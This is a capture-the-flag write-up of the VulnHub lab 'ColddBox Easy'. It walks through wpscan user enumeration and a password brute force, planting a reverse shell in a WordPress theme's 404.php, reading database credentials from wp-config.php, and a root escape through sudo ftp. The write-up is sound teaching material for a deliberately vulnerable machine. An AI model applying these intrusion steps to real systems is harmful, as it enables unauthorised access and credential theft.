---
title: Vulnhub - ColddBox Easy
description: My writeup on ColddBox Easy box.
categories:
 - vulnhub
tags: vulnhub wordpress wpscan ftp sudo wp-config
---

![](https://i.imgur.com/Zf32sKS.png)

## Box Stats

| Box Info      | Details       | 
| ------------- |:-------------:| 
| Box Name :    | **ColddBox**  | 
| Series :      | **ColddBox**         |
| Difficulty :  | **Easy**             |   
| Release Date :| **23 Oct 2020**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | [C0ldd](https://twitter.com/@C0ldd__){:target="_blank"}     | 
| Download :    | [ColddBox](https://www.vulnhub.com/entry/colddbox-easy,586/){:target="_blank"}      | 

## Summary

Hello all! Finally i found the time to do some CTF! :smile: This one was a very very very easy box based on wordpress stuff, a good box for warmup. We start by running a wpscan scan and we discover 3 users & we run a brute force on them using the rockyou wordlist. This way we get a shell as www-data. Privesc to root is simple we can exploit multiple stuff. Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.15                                                                                                                                                                130 ↵
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 23:54 EET
Nmap scan report for colddbox-easy.zte.com.cn (192.168.1.15)
Host is up (0.00028s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
MAC Address: 08:00:27:5A:F4:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
$ nmap -p 80,4512 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 23:54 EET
Nmap scan report for colddbox-easy.zte.com.cn (192.168.1.15)
Host is up (0.00061s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
```

Once we visit the website, we can see a wordpress site:

![](https://i.imgur.com/EftMppU.png)

Let's run a `wpscan` on it, we can see there are no plugins but 3 users:

```
$ wpscan --no-banner --url http://$ip/ -e ap,u
..data..

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Of course we will continue with a brute force on them using the `rockyou` wordlist:

```
$ wpscan --no-banner --url http://$ip/ -U philip,c0ldd,hugo -P /usr/share/wordlists/rockyou.txt                                                            130 ↵
..data..

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                                                                     
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

Perfect we can login in as `c0ldd:9876543210`

## Shell as www-data

Follow my steps now for a reverse shell:

Once we login into the admin panel `/wp-admin` we have to move under appearance -> editor:

![](https://i.imgur.com/bKuLosB.png)

We click on `404.php` template and we paste our reverse shell & then click update file.

![](https://i.imgur.com/hgWbd53.png)

Now for execution we need the path, which is `/wp-content/themes/twentyfifteen/404.php` & We have shell back:

```
$ nc -lvp 5555                                                                                                                                             127 ↵
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as c0ldd

We have to check the `wp-config.php` for the DB_PASSWORD:

```
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php | grep "DB_PASSWORD"
define('DB_PASSWORD', 'cybersecurity');
www-data@ColddBox-Easy:/var/www/html$ su - c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:~$ whoami;id
c0ldd
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

## Shell as root

There are lot of ways to gain a root shell, if you're beginner you should try to exploit them all it's a great practise. I'll use the `sudo -l` way to exploit ftp.

```
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> !/bin/bash
root@ColddBox-Easy:~# whoami;id
root
uid=0(root) gid=0(root) grupos=0(root)
```


## Reading the flag(s)

```
root@ColddBox-Easy:/root# base64 -d root.txt ; printf "\n"
¡Felicidades, máquina completada!
root@ColddBox-Easy:/root# base64 -d /home/c0ldd/user.txt ; printf "\n"
Felicidades, primer nivel conseguido!
```

No idea what this means, one sec let me translate :P

`root.txt -> Cheers, machine completed!`

`user.txt -> Cheers, first level achieved!`

Great.

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:

Until next time keep pwning hard! :fire:
